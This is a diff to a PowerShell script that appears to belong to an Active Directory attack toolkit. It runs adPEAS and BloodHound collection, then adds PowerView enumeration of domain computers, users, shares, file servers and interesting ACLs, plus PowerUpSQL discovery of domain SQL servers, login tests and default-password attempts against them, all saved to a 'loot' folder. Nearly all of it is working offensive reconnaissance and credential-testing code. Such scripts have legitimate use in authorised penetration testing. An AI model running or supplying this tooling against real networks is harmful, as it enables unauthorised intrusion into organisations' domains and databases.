@@ -1,8 +1,46 @@
-mkdir C:/blood/loot
+mkdir C:/blood/loot/AD
 if($asme_1029384756) {
-    Invoke-Adpeas -Domain $domain_1029384756  | tee C:/blood/loot/"$domain_1029384756"_adpeas.txt
-    Invoke-BloodHound -Domain $domain_1029384756 -CollectionMethod All -outputdirectory C:/blood/loot/ 
+    Invoke-Adpeas -Domain $domain_1029384756  | tee C:/blood/loot/AD/"$domain_1029384756"_adpeas.txt
+    Invoke-BloodHound -Domain $domain_1029384756 -CollectionMethod All -outputdirectory C:/blood/loot/AD/
+    echo "STARTING CUSTOM ENUMERATION . . ."
+    echo "ENUMERATING AD:" >> tee C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    Get-DomainComputer -Domain $domain_1029384756 | select dnshostname >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    echo "ENUMERATING AD USERS:" >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    Get-DomainUser -Domain $domain_1029384756 | select -ExpandProperty cn >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    echo "ENUMERATING DOMAIN SHARES:" >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    Find-DomainShare -Domain $domain_1029384756 >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    echo "ENUMERATING DOMAIN FILE SERVERS:" >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    Get-DomainFileServer -Domain $domain_1029384756 >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    echo "ENUEMRATING INTRESTING ACL's:" >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    Find-InterestingDomainAcl -Domain $domain_1029384756 | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    echo "ENUMERATING DOMAIN SQL DB:" >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    Get-SQLInstanceDomain >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    echo "TRYING TO LOGIN AS $env:username TO THE ABOVE DATABASES:" >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    echo "TRYING DEFAULT CREDS TO THE ABOVE DATABASES:" >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw  >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
 } else {
-    Invoke-Adpeas -Domain $domain_1029384756 -Username $user_1029384756 -Password $pass_1029384756 | tee C:/blood/loot/"$domain_1029384756"_adpeas.txt
-    Invoke-BloodHound -Domain $domain_1029384756 -LDAPUser $user_1029384756 -LDAPPass $pass_1029384756 -CollectionMethod All -outputdirectory C:/blood/loot/ 
+    Invoke-Adpeas -Domain $domain_1029384756 -Username $user_1029384756 -Password $pass_1029384756 | tee C:/blood/loot/AD/"$domain_1029384756"_adpeas.txt
+    Invoke-BloodHound -Domain $domain_1029384756 -LDAPUser $user_1029384756 -LDAPPass $pass_1029384756 -CollectionMethod All -outputdirectory C:/blood/loot/AD/ 
+
+    $SecPassword = ConvertTo-SecureString "$pass_1029384756" -AsPlainText -Force
+    $Cred = New-Object System.Management.Automation.PSCredential("$user_1029384756", $SecPassword) 
+
+    echo "STARTING CUSTOM ENUMERATION . . ."
+    echo "ENUMERATING AD AS $user_1029384756" >> tee C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    Get-DomainComputer -Domain $domain_1029384756 -Credential $Cred | select dnshostname >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    echo "ENUMERATING AD USERS AS $user_1029384756:" >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    Get-DomainUser -Domain $domain_1029384756 -Credential $Cred | select -ExpandProperty cn >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    echo "ENUMERATING DOMAIN SHARES AS $user_1029384756:" >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    Find-DomainShare -Domain $domain_1029384756 -Credential $Cred >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    echo "ENUMERATING DOMAIN FILE SERVERS AS $user_1029384756:" >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    Get-DomainFileServer -Domain $domain_1029384756 -Credential $Cred >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    echo "ENUEMRATING INTRESTING ACL's AS $user_1029384756:" >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    Find-InterestingDomainAcl -Domain $domain_1029384756 -Credential $Cred | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    echo "ENUMERATING DOMAIN SQL DB AS $user_1029384756:" >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    Get-SQLInstanceDomain -Username "$user_1029384756" -Password "$pass_1029384756" >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    echo "TRYING TO LOGIN AS $user_1029384756 TO THE ABOVE DATABASES:" >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    Get-SQLInstanceDomain -Username "$user_1029384756" -Password "$pass_1029384756" | Get-SQLConnectionTestThreaded -Username "$user_1029384756" -Password "$pass_1029384756" | ft >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    echo "TRYING DEFAULT CREDS TO THE ABOVE DATABASES:" >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
+    Get-SQLInstanceDomain -Username "$user_1029384756" -Password "$pass_1029384756" | Get-SQLServerLoginDefaultPw  >> C:/blood/loot/AD/"$domain_1029384756"_enum.txt
 }
